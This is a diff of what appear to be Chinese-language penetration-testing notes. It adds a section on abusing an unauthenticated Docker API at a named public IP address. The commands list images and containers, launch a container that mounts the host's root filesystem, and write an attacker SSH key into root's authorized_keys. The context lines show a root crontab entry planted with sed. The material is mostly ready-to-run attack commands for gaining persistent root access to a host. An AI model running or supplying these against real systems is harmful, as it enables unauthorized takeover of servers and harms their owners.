@@ -25,3 +25,14 @@ sed -i '$a*/2 *    * * *    root  bash /tmp/test.sh ' /test/etc/crontab
 
 # 或者写入authorized_keys 然后ssh
 ```
+
+## docker 未授权
+
+```sh
+docker -H tcp://47.92.7.138:2375 images
+docker -H tcp://47.92.7.138:2375 ps -a
+# 启动容器并将宿主机磁盘挂载到/mnt
+docker -H tcp://47.92.7.138:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04
+cd /mnt/root/.ssh/
+echo "ssh-rsa AAAAB3NzaC1yc2......." > authorized_keys
+```
